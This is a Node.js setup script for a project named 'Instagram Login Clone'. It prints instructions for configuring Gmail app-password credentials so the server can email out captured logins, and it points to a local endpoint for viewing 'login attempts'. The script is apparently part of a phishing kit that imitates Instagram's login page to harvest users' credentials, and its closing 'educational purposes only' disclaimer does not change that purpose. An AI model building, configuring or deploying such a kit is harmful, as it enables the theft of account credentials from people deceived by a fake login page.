const fs = require('fs');
const path = require('path');

console.log('🚀 Instagram Login Clone Setup');
console.log('==============================\n');

// Check if package.json exists
if (!fs.existsSync('package.json')) {
    console.log('❌ package.json not found. Please run this from the project directory.');
    process.exit(1);
}

console.log('📦 Installing dependencies...');
console.log('Run: npm install\n');

console.log('📧 Email Configuration Required:');
console.log('1. Create a Gmail account or use existing one');
console.log('2. Enable 2-Factor Authentication');
console.log('3. Generate App Password:');
console.log('   - Go to Google Account → Security → 2-Step Verification');
console.log('   - App passwords → Generate new password for "Mail"');
console.log('4. Update server.js lines 12-13 with your credentials:\n');
console.log('   user: process.env.EMAIL_USER || \'your-email@gmail.com\'');
console.log('   pass: process.env.EMAIL_PASS || \'your-app-password\'\n');

console.log('🚀 To start the application:');
console.log('   npm start        # Production mode');
console.log('   npm run dev      # Development mode (with auto-restart)\n');

console.log('🌐 Application will be available at: http://localhost:3000');
console.log('📊 View login attempts at: http://localhost:3000/api/logins\n');

console.log('⚠️  IMPORTANT: This is for educational purposes only!');
console.log('   Always ensure proper authorization before collecting user data.');
